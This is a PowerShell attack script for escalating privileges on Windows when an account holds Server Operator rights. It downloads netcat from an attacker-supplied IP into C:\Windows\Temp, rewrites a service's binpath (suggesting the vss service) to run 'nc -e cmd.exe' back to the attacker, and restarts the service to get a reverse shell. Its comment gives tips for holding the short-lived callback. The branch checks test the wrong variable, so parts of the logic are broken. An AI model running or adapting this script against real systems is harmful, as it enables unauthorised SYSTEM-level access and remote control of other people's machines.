function Invoke-ServerOperator
{

<# 
This script is used when a user has server operator, you do need a service. If you do not know a service, and server operator is being used
You can always try and use vss service. You will need nc64.exe in your web server directory. Once you get a call back you have limited time
on the machine, this is just because of the call back you are getting and the service trying to restart, windows will finally say screw it and shut it down
so make sure you move fast and get what you need, or have another nc64.exe ready to go to make a 2nd call back, which will be more stable. To do this
quickly at the end of the attack on the PowerShell script that is a copy and paste output that can be used for port 1111
#>

[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP

)
 	if ($AttackerIP)
		{
			$confirmation = Read-Host "Do you have a web server running with nc64.exe or nc.exe? (Y/N):"
        if ($confirmation -eq 'Y')
          {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Continuing Script"
          }
        else {
          write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Need to have running to continue script"
        }

        $nc = Read-Host "Do you want nc64.exe or nc.exe (nc64.exe / nc.exe):"
        if ($confirmation -eq 'nc64.exe')
        {
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to download nc64.exe"
			
			cd C:\Windows\Temp; wget http://$AttackerIP/$nc -outfile nc64.exe

			$RunningService = Read-Host -Prompt 'Input Running Service if unknown try vss'
			$Port = Read-Host -Prompt 'Input Reverse Shell Port ex 4444'
			
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Changing service binpath to C:\Windows\Temp"

			sc.exe config $RunningService binpath="C:\Windows\Temp\nc64.exe -e cmd.exe $AttackerIP $Port"

			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to stop $RunningService"

			stop-service $RunningService -force
		}
		elseif ($confirmation -eq 'nc.exe')
		{
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to download nc.exe"
			
			cd C:\Windows\Temp; wget http://$AttackerIP/nc.exe -outfile nc.exe

			$RunningService = Read-Host -Prompt 'Input Running Service if unknown try vss'
			$Port = Read-Host -Prompt 'Input Reverse Shell Port ex 4444'
			
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Changing service binpath to C:\Windows\Temp"

			sc.exe config $RunningService binpath="C:\Windows\Temp\nc.exe -e cmd.exe $AttackerIP $Port"

			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to stop $RunningService"

			stop-service $RunningService -force
		}
		else 
		{
          write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Need to have running to continue script"
        }

			 $confirmation = Read-Host "Do you have your listener running on $AttackerIP (Y/N)?:"
      if ($confirmation -eq 'y')

        {
        
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to start $RunningService"

        write-host -foregroundcolor green -backgroundcolor black "`n`n[*] C:\Windows\Temp\nc64.exe -e cmd $AttackerIP 1111"

		start-service $RunningService
        
        }

    else

    	{

        'Cancelled'
        
    	}
   	}
}